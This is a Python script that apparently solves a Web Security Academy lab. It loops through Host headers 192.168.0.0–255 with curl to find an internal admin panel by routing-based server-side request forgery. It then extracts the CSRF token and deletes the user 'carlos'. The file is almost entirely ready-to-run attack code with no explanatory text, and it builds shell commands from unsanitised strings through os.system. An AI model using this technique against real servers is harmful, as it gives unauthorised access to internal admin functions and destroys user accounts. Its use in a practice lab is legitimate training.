import re
import os
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    login_url = burp_url + '/login'
    delete_url = burp_url + '/admin/delete?username=carlos'

    session = requests.Session()

    response = session.get(login_url)
    cookies = response.cookies
    cookies_dict = requests.utils.dict_from_cookiejar(cookies)
    cookies_header = '; '.join([f"{key}={value}" for key, value in cookies_dict.items()])

    local_address = None

    for i in range(256):
        command = (
            f"curl --path-as-is -k -X POST "
            f"-H 'Host: 192.168.0.{i}' '{burp_url}/admin' "
            f"-A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' "
            f"-H 'Cookie: {cookies_header}' -i -o response.txt"
        )
        os.system(command)

        with open("response.txt", "r") as f:
            response_content = f.read()

        if "HTTP/2 200" in response_content:
            print(f"Found valid Host: 192.168.0.{i}")
            local_address = f"192.168.0.{i}"
            break

    with open("response.txt", "r") as f:
        response_content = f.read()

    csrf_token = re.search(r'name="csrf" value="([^"]+)"', response_content)
    if csrf_token:
        csrf = csrf_token.group(1)
    else:
        print("CSRF token not found.")
        sys.exit(1)

    command = (
        f"curl --path-as-is -k "
        f"-H 'Host: {local_address}' '{delete_url}&csrf={csrf}' "
        f"-A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' "
        f"-H 'Cookie: {cookies_header}'"
    )
    os.system(command)
